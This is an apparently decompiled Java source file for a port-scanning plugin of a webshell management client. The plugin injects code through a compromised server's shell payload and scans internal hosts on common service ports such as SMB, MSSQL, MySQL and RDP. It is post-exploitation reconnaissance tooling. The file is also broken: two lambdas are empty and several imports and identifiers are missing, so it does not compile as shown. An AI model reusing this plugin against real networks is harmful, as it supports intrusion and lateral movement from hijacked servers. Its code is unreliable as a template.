package shells.plugins.generic;
import core.Encoding;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.component.DataView;
import core.ui.component.dialog.GOptionPane;
import java.awt.Color;
import java.awt.Component;
import java.awt.event.ActionEvent;
import java.util.LinkedList;
import java.util.Vector;
import javax.swing.JButton;
import javax.swing.JCheckBox;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JSplitPane;
import javax.swing.JTable;
import javax.swing.JTextField;
import javax.swing.SwingUtilities;
import util.Log;
import util.UiFunction;
import util.functions;
import util.http.ReqParameter;

public abstract class PortScan implements Plugin {
  private static final Vector COLUMNS_VECTOR = new Vector(new CopyOnWriteArrayList((Object[])new String[] { "IP", "Port", "Status" }));
  
  private static final JLabel OPEN_LABEL = new JLabel("Open");
  private static final JLabel CLOSED_LABEL = new JLabel("Closed");
  private static ComponentRenderer COMPONENT_RENDERER = null;
  
  private final JPanel panel;
  
  private final DataView dataView;
  
  private final JButton scanButton;
  private final JButton stopButton;
  private final JLabel hostLabel;
  private final JLabel portLabel;
  private final JCheckBox onlyOpenPortCheckBox;
  private final JTextField hostTextField;
  private final JTextField portTextField;
  private final JSplitPane portScanSplitPane;
  private boolean loadState;
  private ShellEntity shellEntity;
  private Payload payload;
  private Encoding encoding;
  private boolean isRunning;
  
  static {
    OPEN_LABEL.setOpaque(true);
    CLOSED_LABEL.setOpaque(true);
    OPEN_LABEL.setBackground(Color.GREEN);
    CLOSED_LABEL.setBackground(Color.RED);
  }

  
  public PortScan() {
    this.panel = new JPanel(new BorderLayout());
    
    COMPONENT_RENDERER = new ComponentRenderer();
    
    this.hostLabel = new JLabel("host :");
    this.portLabel = new JLabel("ports :");
    
    this.scanButton = new JButton("scan");
    this.stopButton = new JButton("stop");
    this.dataView = new DataView(null, COLUMNS_VECTOR, -1, -1);
    this.hostTextField = new JTextField("127.0.0.1", 15);
    this.portTextField = new JTextField("21,22,80-81,88,443,445,873,1433,3306,3389,8080,8088,8888", 60);
    this.onlyOpenPortCheckBox = new JCheckBox("仅显示开放端口", false);
    this.portScanSplitPane = new JSplitPane();
    
    this.portScanSplitPane.setOrientation(0);
    this.portScanSplitPane.setDividerSize(0);
    
    JPanel topPanel = new JPanel();
    topPanel.add(this.hostLabel);
    topPanel.add(this.hostTextField);
    topPanel.add(this.portLabel);
    topPanel.add(this.portTextField);
    topPanel.add(this.onlyOpenPortCheckBox);
    topPanel.add(this.scanButton);
    topPanel.add(this.stopButton);
    
    this.portScanSplitPane.setTopComponent(topPanel);
    this.portScanSplitPane.setBottomComponent(new JScrollPane((Component)this.dataView));
    
    this.dataView.getColumn("Status").setCellRenderer(COMPONENT_RENDERER);
    
    this.panel.add(this.portScanSplitPane);
  }
  
  private void load() {
    if (!this.loadState) {
      try {
        byte[] data = readPlugin();
        if (this.loadState = this.payload.include(getClassName(), data)) {
          this.loadState = true;
          Log.log("Load success", new Object[0]);
        } else {
          Log.log("Load fail", new Object[0]);
        } 
      } catch (Exception e) {
        Log.error(e);
      } 
    }
  }


  
  private void scanButtonClick(ActionEvent actionEvent) {
    load();
    if (!this.isRunning) {
      this.isRunning = true;
      (new Thread(() -> {
            long startTime = System.currentTimeMillis();

            
            LinkedList<String> hosts = functions.stringToIps(this.hostTextField.getText().trim());

            
            String ports = formatPorts(this.portTextField.getText().trim());

            
            if (ports.isEmpty() && hosts.isEmpty()) {
              this.isRunning = false;

              
              GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.panel), "host/ports 是空的");

              
              return;
            } 

            
            SwingUtilities.invokeLater(());

            
            GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.panel), "已开启扫描");

            
            hosts.forEach(());

            
            this.isRunning = false;

            
            Log.log("扫描结束!!! 扫描耗时: %dms", new Object[] { Long.valueOf(System.currentTimeMillis() - startTime) });
          })).start();
    } else {
      GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.panel), "已有扫描线程");
    } 
  }
  
  private void stopButtonClick(ActionEvent actionEvent) {
    if (this.isRunning) {
      this.isRunning = false;
      Log.log("PortScan: %s", new Object[] { "已停止扫描!" });
      GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.panel), "已停止扫描!");
    } 
  }
  
  private void closePlugin() {
    stopButtonClick(null);
  }
  
  private String formatPorts(String ports) {
    LinkedList<Integer> list = functions.stringToPorts(ports);
    StringBuilder stringBuilder = new StringBuilder();
    
    list.forEach(v -> stringBuilder.append(v.toString() + ","));
    
    if (stringBuilder.length() > 0) {
      return stringBuilder.substring(0, stringBuilder.length() - 1);
    }
    return stringBuilder.toString();
  }

  
  private void formatResult(String resultString) {
    String[] lines = resultString.split("\n");
    String[] infos = null;
    Vector<Vector<String>> rowsVector = this.dataView.getDataVector();
    for (String line : lines) {
      infos = line.split("\t");
      if (infos.length >= 3) {
        boolean isOpen = "1".equals(infos[2]);
        if (!this.onlyOpenPortCheckBox.isSelected() || isOpen) {

          
          Vector<String> oneRowVector = new Vector();
          oneRowVector.add(infos[0]);
          oneRowVector.add(infos[1]);
          oneRowVector.add(isOpen ? OPEN_LABEL : CLOSED_LABEL);
          rowsVector.add(oneRowVector);
        } 
      } else {
        Log.error(line);
      } 
    } 
    this.dataView.AddRows(rowsVector);
    this.dataView.getColumn("Status").setCellRenderer(COMPONENT_RENDERER);
  }

  
  public void init(ShellEntity shellEntity) {
    this.shellEntity = shellEntity;
    this.payload = this.shellEntity.getPayloadModule();
    this.encoding = Encoding.getEncoding(this.shellEntity);
    automaticBindClick.bindJButtonClick(PortScan.class, this, PortScan.class, this);
  }



  
  public JPanel getView() {
    return this.panel;
  }
  
  public abstract byte[] readPlugin() throws IOException;
  
  public abstract String getClassName();
  
  class ComponentRenderer
    implements TableCellRenderer {
    public Component getTableCellRendererComponent(JTable table, Object value, boolean isSelected, boolean hasFocus, int row, int column) {
      if (Component.class.isAssignableFrom(value.getClass())) {
        Component component = (Component)value;
        if (isSelected) {
          component.setForeground(table.getSelectionForeground());
        } else {
          component.setForeground(table.getForeground());
        } 
        
        return component;
      } 
      return new JLabel(value.toString());
    }
  }
}
